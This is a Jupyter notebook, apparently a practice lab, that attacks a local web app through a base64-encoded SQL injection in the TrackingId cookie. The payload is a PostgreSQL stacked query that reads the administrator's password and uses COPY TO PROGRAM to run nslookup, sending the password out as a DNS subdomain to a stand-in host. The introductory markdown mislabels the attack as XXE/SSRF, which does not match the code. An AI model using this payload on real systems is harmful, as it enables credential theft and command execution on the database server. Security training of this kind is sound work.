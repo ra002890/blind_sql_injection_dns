{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "SQL Injection - Blind SQL injection with out-of-band data exfiltration\n",
    "\n",
    "XXE - XML external entity injection\n",
    "\n",
    "A aplicação processa um XML e não se protege de injeções de códigos/dados XML externos.\n",
    "Tipo de ataque pode escalar para SSRF - Server side request forgery "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'date': 'Fri, 21 Oct 2022 16:20:19 GMT', 'server': 'uvicorn', 'content-length': '595', 'content-type': 'text/html; charset=utf-8', 'set-cookie': 'TrackingId=ZDdkZmJiNDEtNzlkZS00MWE5LWJjOWUtN2I5MTc5OTcwNzk0; Path=/; SameSite=lax'}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "x = requests.get('http://127.0.0.1:8000/')\n",
    "\n",
    "print(x.headers)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "\n",
    "def base64_encode_str(str):\n",
    "    str_bytes = str.encode(\"ascii\")\n",
    "    base64_bytes = base64.b64encode(str_bytes)\n",
    "    base64_string = base64_bytes.decode(\"ascii\")\n",
    "    return base64_string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "cookies = {'TrackingId': base64_encode_str(\"\"\"585a9538-00a0-4816-9774-ff30f4e50c84';\n",
    "            do $$ \n",
    "            declare c text; \n",
    "            declare p text;  \n",
    "            begin \n",
    "            SELECT into p (SELECT password FROM users WHERE users.name = 'administrator'); \n",
    "            raise notice 'Password: %', p;\n",
    "            c := 'copy (SELECT '''') to program ''nslookup -port=8053 '||p||'.dns_faker dns_faker'''; \n",
    "            execute c; \n",
    "            END; \n",
    "            $$; --\"\"\")}\n",
    "\n",
    "x = requests.get('http://127.0.0.1:8000/', cookies=cookies)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit ('3.10.4')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "31e3562205d0249ddbde2db833a95bbca7f2b748b065900b7380f1c709de36b8"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
